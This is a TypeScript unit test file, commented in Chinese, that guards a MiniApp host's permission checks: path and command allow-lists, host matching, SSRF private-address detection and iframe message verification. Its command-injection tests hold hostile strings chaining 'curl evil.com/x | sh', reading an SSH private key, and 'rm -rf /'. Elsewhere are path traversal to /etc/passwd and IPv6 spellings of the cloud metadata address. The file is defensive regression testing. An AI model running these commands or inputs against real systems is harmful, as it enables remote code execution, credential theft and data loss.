// app-permissions.unit.test.ts — `window.app.*` 授权不变量的回归护栏。
//
// 这些用例锁的是**安全边界**，不是覆盖率：每一条都对应一个"如果判错了会
// 发生什么"的具体后果。改动 `isPathAllowed` / `commandAllowed` /
// `hostAllowed` / `checkAppPermission` 时先看这里。

import { describe, expect, it } from 'vitest';

import {
  checkAppPermission,
  commandAllowed,
  hostAllowed,
  isPathAllowed,
  isPrivateHostname,
  runAppCall,
} from './app-permissions';
import {
  buildAppResult,
  isKnownAppMethod,
  listAppMethods,
  verifyAppCall,
} from './app-protocol';
import type { MiniAppPermissions } from './types';

const NONE: MiniAppPermissions = {};

describe('isPathAllowed', () => {
  it('accepts an exact path and paths under the prefix', () => {
    expect(isPathAllowed('/data/app', ['/data/app'])).toBe(true);
    expect(isPathAllowed('/data/app/sub/file.txt', ['/data/app'])).toBe(true);
  });

  it('rejects a sibling that merely shares a string prefix', () => {
    // 这是 prefix-confusion：声明 /data/secret 不得放行 /data/secrets
    expect(isPathAllowed('/data/secrets/key.pem', ['/data/secret'])).toBe(false);
  });

  it('rejects traversal that escapes the prefix', () => {
    expect(isPathAllowed('/data/app/../../etc/passwd', ['/data/app'])).toBe(false);
  });

  it('normalizes Windows separators and trailing slashes', () => {
    expect(isPathAllowed('C:\\data\\app\\f.txt', ['C:/data/app'])).toBe(true);
    expect(isPathAllowed('/data/app/f.txt', ['/data/app/'])).toBe(true);
  });

  it('denies everything when the allow-list is empty', () => {
    expect(isPathAllowed('/data/app', [])).toBe(false);
  });
});

describe('isPathAllowed: trailing /** glob', () => {
  // 这是真实缺陷的回归护栏：`meta.json` 里作者写的是 `{workspace}/**`，而旧实现
  // 把它当字面量前缀比较，于是**所有**存量 MiniApp 的读文件能力全线失效，
  // 报出 "path not covered by permissions.fs.read" —— 而它的声明完全正确。
  it('treats a trailing /** as "everything under this prefix"', () => {
    expect(isPathAllowed('/data/app/notes.txt', ['/data/app/**'])).toBe(true);
    expect(isPathAllowed('/data/app/a/b/c/deep.txt', ['/data/app/**'])).toBe(true);
  });

  it('admits the prefix directory itself', () => {
    // 作者写 '**' 的意图是"这个目录下的一切"；把目录本身排除在外是反直觉陷阱
    expect(isPathAllowed('/data/app', ['/data/app/**'])).toBe(true);
  });

  it('still refuses to escape the globbed prefix', () => {
    expect(isPathAllowed('/data/other/file.txt', ['/data/app/**'])).toBe(false);
    expect(isPathAllowed('/data/app/../../etc/passwd', ['/data/app/**'])).toBe(false);
  });

  it('keeps prefix-confusion protection under a glob', () => {
    // `{appdata}/src/**` 不得放行 `{appdata}/src-secrets` —— glob 放宽的是
    // "深度"，不是"横向邻居"
    expect(isPathAllowed('/data/src-secrets/key.pem', ['/data/src/**'])).toBe(false);
    expect(isPathAllowed('/data/src/key.pem', ['/data/src/**'])).toBe(true);
  });

  it('handles the Windows separator form', () => {
    expect(isPathAllowed('C:\\data\\app\\f.txt', ['C:\\data\\app\\**'])).toBe(true);
  });

  it('does not treat a mid-path * as a glob', () => {
    // 只支持尾部 glob：中间段的 '*' 必须当字面量，否则 meta.json 会退化成
    // 一个难以审计的能力声明
    expect(isPathAllowed('/data/a/x/b.txt', ['/data/*/b.txt'])).toBe(false);
  });

  it('handles a bare ** as "deny everything" rather than "allow everything"', () => {
    // 归一化后前缀为空串 —— 空串在比较里恒不匹配，是安全的失败方向。
    // 若哪天把它当成"匹配一切"，一行 `{appdata}/..` 就能开全局 fs。
    expect(isPathAllowed('/etc/passwd', ['**'])).toBe(false);
  });
});

describe('commandAllowed', () => {
  it('matches the first token against the allow-list', () => {
    expect(commandAllowed('git log --oneline', ['git'])).toBe(true);
    expect(commandAllowed('git log', ['ffmpeg', 'git'])).toBe(true);
  });

  it('rejects a command whose first token is not allowed', () => {
    expect(commandAllowed('rm -rf /', ['git'])).toBe(false);
    expect(commandAllowed('curl evil.com', ['git'])).toBe(false);
  });

  it('tolerates a .exe suffix on either side (Windows)', () => {
    expect(commandAllowed('git status', ['git.exe'])).toBe(true);
    expect(commandAllowed('git.exe status', ['git'])).toBe(true);
  });

  it('rejects an empty command', () => {
    expect(commandAllowed('   ', ['git'])).toBe(false);
  });

  // 白名单只取首个 token，而执行侧把整条字符串交给 `cmd.exe /d /s /c`。所以
  // `git` 在白名单里就等于「可以启动 git」，于是 `git && evil` 也是「启动 git」。
  // 下面每一条在修复前都返回 true，也就是 shell.allow: ["git"] = 任意命令执行。
  it('refuses shell chaining, substitution, redirection and variable expansion', () => {
    const escapes = [
      'git status && curl evil.com/x | sh',
      'git status & type C:/Users/victim/.ssh/id_rsa',
      'git status | cmd /c evil',
      'git status ; rm -rf /',
      'git status `whoami`',
      'git status $(whoami)',
      'git status > C:/out.txt',
      'git status < C:/in.txt',
      'git status %USERPROFILE%',
      'git status ^& evil',
      'git status\n evil',
      'git status" && evil',
    ];
    for (const c of escapes) {
      expect(commandAllowed(c, ['git']), c).toBe(false);
    }
  });

  it('still allows the ordinary commands bundled MiniApps actually issue', () => {
    // 元字符黑名单最容易犯的错是收得太宽、把内置应用真实的调用也毙了。
    // `~` / `*` / `?` / `,` / `[]` / `{}` 是 glob 与花括号展开，只改参数不改
    // 命令，所以刻意不收；`git diff HEAD~20 HEAD` 正是 git-graph 会发的。
    const ok = [
      'git status',
      'git log --oneline',
      'git diff HEAD~20 HEAD',
      'git checkout main',
      'git -C /some/dir status',
    ];
    for (const c of ok) {
      expect(commandAllowed(c, ['git']), c).toBe(true);
    }
  });
});

describe('hostAllowed', () => {
  it('matches exact host and subdomains', () => {
    expect(hostAllowed('https://api.example.com/x', ['api.example.com'])).toBe(true);
    expect(hostAllowed('https://v2.api.example.com/x', ['api.example.com'])).toBe(true);
  });

  it('rejects a suffix-confusion host', () => {
    expect(hostAllowed('https://evil-example.com/x', ['example.com'])).toBe(false);
    expect(hostAllowed('https://example.com.evil.io/x', ['example.com'])).toBe(false);
  });

  it('rejects an unparseable url', () => {
    expect(hostAllowed('not-a-url', ['example.com'])).toBe(false);
  });
});

describe('isPrivateHostname', () => {
  it('flags loopback, private ranges, link-local and cloud metadata', () => {
    expect(isPrivateHostname('localhost')).toBe(true);
    expect(isPrivateHostname('127.0.0.1')).toBe(true);
    expect(isPrivateHostname('169.254.169.254')).toBe(true);
    expect(isPrivateHostname('10.1.2.3')).toBe(true);
    expect(isPrivateHostname('172.16.0.1')).toBe(true);
    expect(isPrivateHostname('192.168.1.1')).toBe(true);
    expect(isPrivateHostname('::1')).toBe(true);
  });

  it('does not flag public hosts', () => {
    expect(isPrivateHostname('api.example.com')).toBe(false);
    expect(isPrivateHostname('172.32.0.1')).toBe(false);
    expect(isPrivateHostname('8.8.8.8')).toBe(false);
    expect(isPrivateHostname('2001:db8::1')).toBe(false);
  });

  // IPv6 有无穷多种写法，逐个补字面量是打地鼠：下面每一条在修复前都返回
  // false，也就是「云 metadata / loopback 那条 SSRF 红线有一个绕过口」。
  // [::ffff:a9fe:a9fe] 就是 169.254.169.254 的 IPv4-mapped 写法。
  it('flags every spelling of the IPv6 ranges it is meant to cover', () => {
    const privateV6 = [
      '::1', // 展开写法
      '0:0:0:0:0:0:0:1', // 同上，完全不压缩
      '::', // 未指定
      'fc00::1', // ULA
      'fd12:3456::1', // ULA
      'fc00:0:0:0:0:0:0:1', // ULA，展开写法
      'fe80::1', // 链路本地
      'fe80:0:0:0:0:0:0:1', // 同上，展开写法
      '::ffff:7f00:1', // = 127.0.0.1
      '::ffff:a9fe:a9fe', // = 169.254.169.254
      '::ffff:127.0.0.1', // = 127.0.0.1，四段式
      '::ffff:169.254.169.254', // = 云 metadata，四段式
      '0:0:0:0:0:ffff:7f00:0001', // mapped，完全展开
    ];
    for (const h of privateV6) {
      expect(isPrivateHostname(h), h).toBe(true);
      expect(isPrivateHostname(`[${h}]`), `[${h}]`).toBe(true);
    }
  });

  it('fails closed on something that only looks like an IPv6 address', () => {
    // 解析不出来 = 不是我们认识的地址。放行一个"看不懂的地址"不是安全默认值。
    expect(isPrivateHostname('::ffff::1')).toBe(true);
    expect(isPrivateHostname('gggg::1')).toBe(true);
    expect(isPrivateHostname('1:2:3:4:5:6:7:8:9')).toBe(true);
  });
});

describe('checkAppPermission', () => {
  it('denies fs when no scope is declared', () => {
    expect(checkAppPermission('fs.readFile', { path: '/x' }, NONE).allowed).toBe(false);
  });

  it('allows a read inside the declared prefix but not outside', () => {
    const perms: MiniAppPermissions = { fs: { read: ['/data/app'] } };
    expect(checkAppPermission('fs.readFile', { path: '/data/app/a.txt' }, perms).allowed).toBe(true);
    expect(checkAppPermission('fs.readFile', { path: '/data/other/a.txt' }, perms).allowed).toBe(
      false,
    );
  });

  it('does not let a read grant authorize a write', () => {
    const perms: MiniAppPermissions = { fs: { read: ['/data/app'] } };
    expect(checkAppPermission('fs.writeFile', { path: '/data/app/a.txt' }, perms).allowed).toBe(
      false,
    );
  });

  it('requires both endpoints of copyFile to be writable', () => {
    const perms: MiniAppPermissions = { fs: { write: ['/data/app'] } };
    expect(
      checkAppPermission('fs.copyFile', { from: '/data/app/a', to: '/data/app/b' }, perms).allowed,
    ).toBe(true);
    expect(
      checkAppPermission('fs.copyFile', { from: '/data/app/a', to: '/etc/passwd' }, perms).allowed,
    ).toBe(false);
  });

  it('denies net.fetch for non-https even with a matching host', () => {
    const perms: MiniAppPermissions = { net: { allow: ['api.example.com'] } };
    expect(
      checkAppPermission('net.fetch', { url: 'http://api.example.com/x' }, perms).allowed,
    ).toBe(false);
    expect(
      checkAppPermission('net.fetch', { url: 'https://api.example.com/x' }, perms).allowed,
    ).toBe(true);
  });

  it('denies app.call unless node is enabled', () => {
    expect(checkAppPermission('call.call', { method: 'x' }, NONE).allowed).toBe(false);
    expect(
      checkAppPermission('call.call', { method: 'x' }, { node: { enabled: true } }).allowed,
    ).toBe(true);
  });

  it('allows storage / os without declarations', () => {
    expect(checkAppPermission('storage.get', { key: 'k' }, NONE).allowed).toBe(true);
    expect(checkAppPermission('os.info', null, NONE).allowed).toBe(true);
  });
});

describe('runAppCall', () => {
  it('never reaches the dispatcher when permission is denied', async () => {
    let called = false;
    // 用 net 而不是 fs：fs 族在 renderer 侧不预判（见下方 fs 回归组），
    // 拿它来验证"拒绝时不派发"会因前提不成立而假绿。
    const res = await runAppCall(
      'net.fetch',
      { url: 'https://evil.example/x' },
      { net: { allow: ['api.example.com'] } },
      async () => {
        called = true;
        return { ok: true as const, result: 'should-not-happen' };
      },
    );
    expect(called).toBe(false);
    expect(res.ok).toBe(false);
  });

  it('converts a dispatcher throw into a HOST_ERROR envelope', async () => {
    const res = await runAppCall('os.info', null, NONE, async () => {
      throw new Error('boom');
    });
    expect(res).toEqual({ ok: false, error: { code: 'HOST_ERROR', message: 'boom' } });
  });

  it('passes the result through on success', async () => {
    const res = await runAppCall('os.info', null, NONE, async () => ({ ok: true, result: { platform: 'win32' } }));
    expect(res).toEqual({ ok: true, result: { platform: 'win32' } });
  });
});

/**
 * 宿主错误必须以 reject 抵达作者，而不是 resolve 一个错误信封。
 *
 * 这组用例锁的是第二个已发货缺陷。`createAppDispatcher` 的契约是**返回**
 * `DispatchResult` 信封（它自己从不 throw —— 网络异常也被它 catch 成
 * `{ok:false,error}`），但 `runAppCall` 把 dispatch 的返回值无条件包成
 * `{ok:true, result: ...}`。于是 sidecar 的每一次失败（PERMISSION_DENIED /
 * ENOENT / UNKNOWN_METHOD / NETWORK_ERROR）都被套成一层"成功"：
 *
 *   runAppCall -> {ok:true, result:{ok:false, error:{...}}}
 *   buildAppResult -> {ok:true, result:{ok:false, error:{...}}}
 *   runtime `if (d.ok) frame.resolve(...)` -> 作者的 Promise **resolve**
 *
 * 作者写 `try { await app.fs.readFile(p) } catch (e) { showError(e) }` 时
 * catch 永远不触发；`const text = await app.fs.readFile(p)` 拿到的是
 * `{ok:false,...}` 对象而不是文件内容。runtime 自己的注释写着"权限不足时宿主
 * reject，作者据此提示用户，而不是静默失败"—— 实际行为与它相反，且对全部
 * 30 个方法一致。
 *
 * 根因是类型签名在撒谎：dispatch 被声明为 `Promise<unknown>`，抹掉了它真正
 * 返回信封的事实，于是 `runAppCall` 无从区分"业务结果"与"失败信封"。
 */
describe('host failures must reject, not resolve with an error envelope', () => {
  /** 与 `createAppDispatcher` 的真实返回同形。 */
  const deniedDispatcher = async () => ({
    ok: false as const,
    error: { code: 'PERMISSION_DENIED', message: 'path not covered by permissions.fs.read' },
  });

  it('propagates a dispatcher error envelope as ok:false', async () => {
    const res = await runAppCall('fs.readFile', { path: '/x' }, NONE, deniedDispatcher);
    expect(res).toEqual({
      ok: false,
      error: { code: 'PERMISSION_DENIED', message: 'path not covered by permissions.fs.read' },
    });
  });

  it('never reports ok:true while carrying a nested ok:false', async () => {
    // 这正是作者实际看到的形态：ok 为真、result 里却藏着失败信封。
    const res = await runAppCall('storage.get', { key: 'k' }, NONE, deniedDispatcher);
    expect(res.ok).toBe(false);
    // 收窄后直接读 error —— 不需要 `as` 断言，正是修好契约的回报。
    if (res.ok) throw new Error('expected a failure envelope');
    expect(res.error.code).toBe('PERMISSION_DENIED');
  });

  it('survives the wire hop, so the runtime rejects instead of resolving', async () => {
    // 端到端到 iframe 边界：buildAppResult 必须把失败翻成 ok:false，
    // runtime 的 `if (d.ok) resolve else reject` 才会走 reject 分支。
    //
    // 用 `fs.readFile` 而不是 net：net 在 renderer 就被预判拦下（NONE 没有
    // net.allow），dispatcher 根本不会被调用，测的就不是信封透传了。fs 恰好
    // 相反 —— renderer 不预判 fs，失败只可能来自 dispatcher，正是本例要的路径。
    const outcome = await runAppCall('fs.readFile', { path: '/x' }, NONE, deniedDispatcher);
    const wire = buildAppResult('n-1', 'c-1', outcome);
    expect(wire).toEqual({
      kind: 'app.result',
      nonce: 'n-1',
      id: 'c-1',
      ok: false,
      error: { code: 'PERMISSION_DENIED', message: 'path not covered by permissions.fs.read' },
    });
  });

  it('still wraps a genuinely thrown dispatcher into HOST_ERROR', async () => {
    // 抛异常的 dispatcher（测试替身、未来的实现）不能被当成成功。
    const res = await runAppCall('os.info', null, NONE, async () => {
      throw new Error('boom');
    });
    expect(res).toEqual({ ok: false, error: { code: 'HOST_ERROR', message: 'boom' } });
  });
});

/**
 * `fs.*` 的 renderer 预判回归组。
 *
 * 这组用例锁的是一个**已发货的缺陷**：`meta.json` 的 schema 强制 fs 路径以
 * `{appdata}` / `{workspace}` 模板开头，而模板展开需要 sidecar 的
 * `currentAgentDir`（sidecar 进程的可变状态）。renderer 拿不到它，却仍拿未
 * 展开的模板去做前缀比较 —— 结果恒不匹配，合法的 `app.fs.readFile` 在
 * renderer 这道闸就被拒，压根到不了会正确展开的 sidecar。
 *
 * 换句话说：在修复前，任何声明了 `fs.read` / `fs.write` 的 MiniApp 都等于
 * 没有文件能力，而错误信息还写成 "path not covered by permissions.fs.read"，
 * 引导作者去改自己没写错的 meta.json。
 */
describe('fs.* must not be judged in the renderer', () => {
  const APPDATA = '/home/u/.hamuna/miniapps/icon-generator';
  // 与 bundled-miniapps/*/meta.json 里的真实声明同形（未展开的模板）
  const TEMPLATED: MiniAppPermissions = { fs: { read: ['{appdata}/**'], write: ['{appdata}/**'] } };

  it('lets a templated read reach the dispatcher instead of false-denying it', async () => {
    let reached = false;
    const res = await runAppCall('fs.readFile', { path: `${APPDATA}/icon.png` }, TEMPLATED, async () => {
      reached = true;
      return { ok: true as const, result: 'bytes' };
    });
    // 修复前：{ ok: false, reason: 'path not covered by permissions.fs.read' }
    expect(reached).toBe(true);
    expect(res).toEqual({ ok: true, result: 'bytes' });
  });

  it('lets a templated write reach the dispatcher too', async () => {
    let reached = false;
    await runAppCall('fs.writeFile', { path: `${APPDATA}/note.txt`, data: 'x' }, TEMPLATED, async () => {
      reached = true;
      return { ok: true as const, result: null };
    });
    expect(reached).toBe(true);
  });

  it('still refuses fs for an app that declared no fs scope at all', async () => {
    // 跳过预判不等于放行一切：判定被交给 sidecar，而 sidecar 读的是
    // meta.json 本体（无 fs 声明 = fail-closed）。这里锁住 renderer 侧
    // 不会因为"不预判"而对空声明也照样派发。
    expect(NONE.fs).toBeUndefined();
    const decision = checkAppPermission('fs.readFile', { path: `${APPDATA}/x` }, NONE);
    expect(decision.allowed).toBe(false);
  });

  it('leaves the sidecar-side judgement authoritative and unchanged', async () => {
    // renderer 放行之后，sidecar 用**展开后**的前缀独立复算一遍 ——
    // 这才是真正的安全边界。展开后越界与 `..` 穿越都必须仍然被拒。
    const expanded: MiniAppPermissions = { fs: { read: [`${APPDATA}/**`] } };
    expect(checkAppPermission('fs.readFile', { path: `${APPDATA}/icon.png` }, expanded).allowed).toBe(
      true,
    );
    expect(checkAppPermission('fs.readFile', { path: '/etc/passwd' }, expanded).allowed).toBe(false);
    expect(
      checkAppPermission('fs.readFile', { path: `${APPDATA}/../../etc/passwd` }, expanded).allowed,
    ).toBe(false);
  });
});

describe('verifyAppCall trust boundary', () => {
  const iframeWindow = {} as Window;
  const otherWindow = {} as Window;
  const nonce = 'n-1';
  const base = {
    kind: 'app.call',
    nonce,
    id: 'c1',
    payload: { method: 'os.info', params: null, appId: 'demo' },
  };

  const envelope = (data: unknown, source: Window | null = iframeWindow) => ({
    source,
    origin: 'null',
    data,
  });

  it('accepts a well-formed call from the bound iframe', () => {
    expect(verifyAppCall(envelope(base), iframeWindow, nonce, 'demo')).not.toBeNull();
  });

  it('rejects a message from a different window', () => {
    expect(verifyAppCall(envelope(base, otherWindow), iframeWindow, nonce, 'demo')).toBeNull();
  });

  it('rejects a forged nonce', () => {
    const forged = { ...base, nonce: 'attacker' };
    expect(verifyAppCall(envelope(forged), iframeWindow, nonce, 'demo')).toBeNull();
  });

  it('rejects an appId that is not the bound one', () => {
    const foreign = { ...base, payload: { ...base.payload, appId: 'other-app' } };
    expect(verifyAppCall(envelope(foreign), iframeWindow, nonce, 'demo')).toBeNull();
  });

  it('rejects a method the host does not implement', () => {
    const unknown = { ...base, payload: { ...base.payload, method: 'fs.exfiltrateEverything' } };
    expect(verifyAppCall(envelope(unknown), iframeWindow, nonce, 'demo')).toBeNull();
  });

  it('rejects a malformed envelope', () => {
    expect(verifyAppCall(envelope({ kind: 'app.call' }), iframeWindow, nonce, 'demo')).toBeNull();
    expect(verifyAppCall(envelope(null), iframeWindow, nonce, 'demo')).toBeNull();
  });

  it('rejects everything when the iframe is gone', () => {
    expect(verifyAppCall(envelope(base), null, nonce, 'demo')).toBeNull();
  });
});

describe('app.ai permission gate', () => {
  // ai 与 agent 的分离是本项目最关键的一条安全不变量：`ai` 拿到的模型
  // `tools: []`（无任何可调用对象），`agent` 拿到的模型有完整工具、能读写
  // 工作区。若 agent 能被 ai.enabled 顺带打开，任何一个"只想做翻译"的
  // MiniApp 实际上都持有了任意文件写 + 命令执行能力。
  it('denies every ai method unless ai.enabled is explicitly true', () => {
    for (const method of ['ai.complete', 'ai.chat', 'ai.getModels', 'ai.cancel']) {
      expect(checkAppPermission(method, { prompt: 'hi' }, {}).allowed).toBe(false);
      expect(checkAppPermission(method, { prompt: 'hi' }, { ai: {} }).allowed).toBe(false);
    }
  });

  it('does not let ai.enabled open the agent surface', () => {
    const perms: MiniAppPermissions = { ai: { enabled: true } };
    expect(checkAppPermission('agent.run', { prompt: 'hi' }, perms).allowed).toBe(false);
  });

  it('does not let agent.enabled open the ai surface (or vice versa: both are independent)', () => {
    const perms: MiniAppPermissions = { agent: { enabled: true } };
    expect(checkAppPermission('ai.complete', { prompt: 'hi' }, perms).allowed).toBe(false);
  });

  it('enforces allowed_models as a hard allow-list once declared', () => {
    const perms: MiniAppPermissions = { ai: { enabled: true, allowed_models: ['model-a'] } };
    expect(checkAppPermission('ai.complete', { prompt: 'x', model: 'model-a' }, perms).allowed).toBe(
      true,
    );
    // 静默降级到别的模型比直接拒绝危险得多：作者会以为在用 A，实际拿到 B 的输出
    const denied = checkAppPermission('ai.complete', { prompt: 'x', model: 'model-b' }, perms);
    expect(denied.allowed).toBe(false);
    expect(denied.reason).toContain('allowed_models');
  });

  it('supports a "*" wildcard in allowed_models', () => {
    const perms: MiniAppPermissions = { ai: { enabled: true, allowed_models: ['*'] } };
    expect(checkAppPermission('ai.complete', { prompt: 'x', model: 'anything' }, perms).allowed).toBe(
      true,
    );
  });

  it('leaves the model unconstrained when allowed_models is absent or empty', () => {
    const perms: MiniAppPermissions = { ai: { enabled: true } };
    expect(checkAppPermission('ai.complete', { prompt: 'x', model: 'whatever' }, perms).allowed).toBe(
      true,
    );
    const empty: MiniAppPermissions = { ai: { enabled: true, allowed_models: [] } };
    expect(checkAppPermission('ai.complete', { prompt: 'x', model: 'w' }, empty).allowed).toBe(true);
  });

  it('rejects a non-string model rather than coercing it', () => {
    const perms: MiniAppPermissions = { ai: { enabled: true } };
    expect(checkAppPermission('ai.complete', { prompt: 'x', model: 123 }, perms).allowed).toBe(false);
  });
});

describe('app.agent permission gate', () => {
  it('denies every agent method unless agent.enabled is explicitly true', () => {
    for (const method of ['agent.run', 'agent.turnText', 'agent.cancel', 'agent.ensureSession']) {
      expect(checkAppPermission(method, { prompt: 'hi' }, {}).allowed).toBe(false);
    }
  });

  it('allows agent methods once agent.enabled is true', () => {
    const perms: MiniAppPermissions = { agent: { enabled: true } };
    expect(checkAppPermission('agent.run', { prompt: 'hi' }, perms).allowed).toBe(true);
    expect(checkAppPermission('agent.cancel', {}, perms).allowed).toBe(true);
  });
});

describe('fs delete-family classification', () => {
  // 前缀用**已展开的绝对路径**而不是 `{appdata}` 模板：模板展开是 sidecar
  // 执行层的职责（`expandTemplates`），shared 的 `isPathAllowed` 不认模板。
  const READ_ONLY: MiniAppPermissions = { fs: { read: ['/data/app'] } };
  const READ_WRITE: MiniAppPermissions = {
    fs: { read: ['/data/app'], write: ['/data/app'] },
  };

  // rmdir / unlink 是删除动作。若被归入读侧，一个只申请了 fs.read 的 MiniApp
  // 就能删掉用户文件。
  it('treats rmdir / unlink as write operations, not read', () => {
    for (const method of ['fs.rmdir', 'fs.unlink', 'fs.rm']) {
      expect(checkAppPermission(method, { path: '/data/app/x' }, READ_ONLY).allowed).toBe(false);
      expect(checkAppPermission(method, { path: '/data/app/x' }, READ_WRITE).allowed).toBe(true);
    }
  });

  it('treats lstat / access as read operations', () => {
    expect(checkAppPermission('fs.lstat', { path: '/data/app/x' }, READ_ONLY).allowed).toBe(true);
    expect(checkAppPermission('fs.access', { path: '/data/app/x' }, READ_ONLY).allowed).toBe(true);
  });

  it('still bounds rmdir / lstat by the declared prefixes', () => {
    expect(checkAppPermission('fs.rmdir', { path: '/elsewhere/x' }, READ_WRITE).allowed).toBe(false);
    expect(checkAppPermission('fs.lstat', { path: '/elsewhere/x' }, READ_ONLY).allowed).toBe(false);
  });

  it('rejects rmdir / lstat with no path at all', () => {
    expect(checkAppPermission('fs.rmdir', {}, READ_WRITE).allowed).toBe(false);
    expect(checkAppPermission('fs.lstat', {}, READ_ONLY).allowed).toBe(false);
  });
});

describe('app.clipboard must be opt-in', () => {
  // 剪贴板里是宿主的用户状态，典型就是刚复制出来的密码。以前它和 `dialog` 一起
  // 无条件 ALLOW，于是声明空 permissions 的 MiniApp 也读得到；再配一条
  // net.allow 就是一条完整的凭据外泄链。
  it('denies readText when clipboard is not declared at all', () => {
    const d = checkAppPermission('clipboard.readText', {}, {});
    expect(d.allowed).toBe(false);
  });

  it('denies readText when the app declared some other permission but not this one', () => {
    // 这条是真正的回归点：`{ fs: {...} }` 不该顺带带出剪贴板。
    const d = checkAppPermission('clipboard.readText', {}, { fs: { read: ['{appdata}/**'] } });
    expect(d.allowed).toBe(false);
  });

  it('denies when clipboard is declared but explicitly disabled', () => {
    const d = checkAppPermission('clipboard.readText', {}, { clipboard: { enabled: false } });
    expect(d.allowed).toBe(false);
  });

  it('allows once the app opts in', () => {
    const d = checkAppPermission('clipboard.readText', {}, { clipboard: { enabled: true } });
    expect(d.allowed).toBe(true);
  });

  it('leaves dialog and storage alone — they were never the sensitive one', () => {
    for (const method of ['dialog.alert', 'storage.get', 'os.info']) {
      expect(checkAppPermission(method, {}, {}).allowed, method).toBe(true);
    }
  });
});

describe('app protocol surface', () => {  it('exposes only documented methods', () => {
    expect(isKnownAppMethod('fs.readFile')).toBe(true);
    expect(isKnownAppMethod('storage.set')).toBe(true);
    expect(isKnownAppMethod('workspace.readFile')).toBe(false);
  });

  it('never lists a method twice', () => {
    const all = listAppMethods();
    expect(new Set(all).size).toBe(all.length);
  });

  it('echoes the id and nonce so the iframe can pair the response', () => {
    const msg = buildAppResult('n-1', 'c1', { ok: true, result: 42 });
    expect(msg).toEqual({ kind: 'app.result', nonce: 'n-1', id: 'c1', ok: true, result: 42 });
  });
});
